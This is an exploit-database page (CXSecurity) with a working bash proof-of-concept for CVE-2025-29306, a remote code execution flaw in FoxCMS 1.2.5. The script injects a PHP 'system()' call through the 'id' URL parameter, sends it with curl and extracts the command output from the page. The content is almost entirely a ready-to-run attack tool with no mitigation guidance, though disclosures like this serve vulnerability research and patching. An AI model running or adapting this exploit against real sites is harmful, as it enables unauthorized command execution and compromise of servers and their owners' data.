---
title: FoxCMS 1.2.5 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025040030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-23
fetch_date: 2025-10-06T22:02:44.474172
---

# FoxCMS 1.2.5 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **FoxCMS 1.2.5 Remote Code Execution**  **2025.04.22**  Credit:  **[VeryLazyTech](https://cxsecurity.com/author/VeryLazyTech/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-29306](https://cxsecurity.com/cveshow/CVE-2025-29306/ "Click to see CVE-2025-29306")**  CWE: **N/A** | |

# Date: 2025-04-17
# Exploit Title:
# Exploit Author: VeryLazyTech
# Vendor Homepage: https://www.foxcms.org/
# Software Link: https://www.foxcms.cn/
# Version: FoxCMS v.1.2.5
# Tested on: Ubuntu 22.04, Windows Server 2019
# CVE: CVE-2025-29306
# Website: https://www.verylazytech.com
#!/bin/bash
banner() {
cat <<'EOF'
\_\_\_\_\_\_ \_\_\_\_\_\_\_ \_\_\_\_ \_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_\_ \_\_\_ \_\_\_\_\_ \_\_\_ \_\_
/ \_\_\_\ \ / / \_\_\_\_| |\_\_\_ \ / \_ \\_\_\_ \| \_\_\_| |\_\_\_ \ / \_ \\_\_\_ / / \_ \ / /\_
| | \ \ / /| \_| \_\_) | | | |\_\_) |\_\_\_ \ \_\_) | (\_) ||\_ \| | | | '\_ \
| |\_\_\_ \ V / | |\_\_\_ / \_\_/| |\_| / \_\_/ \_\_\_) | / \_\_/ \\_\_, |\_\_) | |\_| | (\_) |
\\_\_\_\_| \\_/ |\_\_\_\_\_| |\_\_\_\_\_|\\_\_\_/\_\_\_\_\_|\_\_\_\_/ |\_\_\_\_\_| /\_/\_\_\_\_/ \\_\_\_/ \\_\_\_/
\_\_ \_\_ \_ \_\_\_\_\_ \_
\ \ / /\_\_ \_ \_\_ \_ \_ | | \_\_ \_ \_\_\_\_\_ \_ |\_ \_|\_\_ \_\_\_| |\_\_
\ \ / / \_ \ '\_\_| | | | | | / \_` |\_ / | | | | |/ \_ \/ \_\_| '\_ \
\ V / \_\_/ | | |\_| | | |\_\_| (\_| |/ /| |\_| | | | \_\_/ (\_\_| | | |
\\_/ \\_\_\_|\_| \\_\_, | |\_\_\_\_\_\\_\_,\_/\_\_\_|\\_\_, | |\_|\\_\_\_|\\_\_\_|\_| |\_|
|\_\_\_/ |\_\_\_/
@VeryLazyTech - Medium
EOF
}
# Call the banner function
banner
set -e
# Check for correct number of arguments
if [ "$#" -ne 2 ]; then
printf "Usage: $0 <url> <command>"
exit 1
fi
TARGET=$1
# Encode payload
ENCODED\_CMD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('\${@print\_r(@system(\"$2\"))}'))")
FULL\_URL="${TARGET}?id=${ENCODED\_CMD}"
echo "[\*] Sending RCE payload: $2"
HTML=$(curl -s "$FULL\_URL")
# Extract <ul> from known XPath location using xmllint
UL\_CONTENT=$(echo "$HTML" | xmllint --html --xpath "/html/body/header/div[1]/div[2]/div[1]/ul" - 2>/dev/null)
# Strip tags, clean up
CLEANED=$(echo "$UL\_CONTENT" | sed 's/<[^>]\*>//g' | sed '/^$/d' | sed 's/^[[:space:]]\*//')
echo
echo "[+] Command Output:"
echo "$CLEANED"

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040030)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top